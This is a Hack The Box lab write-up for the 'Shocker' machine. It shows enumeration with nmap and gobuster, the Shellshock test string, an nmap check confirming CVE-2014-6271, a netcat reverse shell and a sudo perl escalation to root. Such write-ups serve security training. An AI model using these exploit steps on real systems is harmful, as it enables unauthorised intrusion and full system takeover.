---
description: Making use of a famous CVE and an easy priv esc to finish it off
---

# Shocker

## Enumeration

### nmap

```
# Nmap 7.93 scan initiated Sat Jan 28 11:50:58 2023 as: nmap -sC -sV -A -v -Pn -oN shocker.nmap 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.033s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 28 11:51:07 2023 -- 1 IP address (1 host up) scanned in 8.33 seconds
```

We can see that the machine has http and ssh.&#x20;

### Website

The site has one page, with a simple image.

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Source code is also pretty simple, no lingering information or footholds available there.

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

#### Gobuster

Running gobuster gives us nothing in terms of webpages, but it isn't our fault.

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ gobuster dir -u 10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o shocker.gb
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/28 11:59:19 Starting gobuster in directory enumeration mode
===============================================================
Progress: 220561 / 220561 (100.00%)
===============================================================
2023/01/28 12:05:51 Finished
===============================================================
```

In the machine config files, Shocker doesn't redirect webpages without trailing slashes to webpages with trailing slashes, as most usually do. For example, the url http://10.10.10.56/jsquared would be distinct from http://10.10.10.56/jsquared/.

As a result, we need to append the -f flag onto the gobuster command.

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ gobuster dir -u 10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o shocker.gb -f
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/01/28 12:15:55 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]                                                                                                                                                                                            
/icons/               (Status: 403) [Size: 292]
...
```

We've got a /cgi-bin/ directory! I'll enumerate this with gobuster again along with some common sh extensions and get only one result: shell.sh

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ gobuster dir -u 10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o shocker.gb -f -x php,sh
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              sh,php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/01/28 11:59:25 Starting gobuster in directory enumeration mode
===============================================================
/user.sh/             (Status: 200) [Size: 119]
Progress: 661680 / 661683 (100.00%)
===============================================================
2023/01/28 12:38:51 Finished
===============================================================
```

Nice! We can visit http://10.10.10.56/cgi-bin/user.sh and download the file.

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ cat user.sh
Content-Type: text/plain

Just an uptime test script

 12:59:34 up 10 min,  0 users,  load average: 0.22, 0.12, 0.07
```

This looks like an uptime command output, which hints at a bash script running in Shocker.

## Road to User

ShellShock was a vulnerability discovered in 2014 that allowed users to execute arbitrary commands in places that should've been safe. One example was

```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

This was so troublesome because user input was often used in environment variables, which meant that attackers could use an RCE in the User-Agent or Cookie strings.

We can check for shellshock by running the nmap script http-shellshock with arguments uri=/cgi-bin/user.sh:

```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 12:21 CST
Nmap scan report for 10.10.10.56
Host is up (0.031s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|                                                         
|     Disclosure date: 2014-09-24
|     References:                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

Looks like the host is vulnerable.

I'll start my netcat listener on port 1337 and add a reverse shell payload.

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

The response hangs, and checking on our netcat yields a shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 48700
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

I'll upgrade the shell and get user.txt while I'm at it.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.56] 48706
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<-bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'                        
shelly@Shocker:/usr/lib/cgi-bin$ ^Z
zsh: suspended  nc -lvnp 1337

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 1337

shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
<REDACTED>
```

## Privilege Escalation

I always check sudo -l first to see if I can leverage any easy exploits, and I get a free path to root.

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

GTFOBins has a page on perl at [https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/), and a simple -e flag and use of the exec function allows us to get root and root.txt to complete the box.

```
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
# 
```
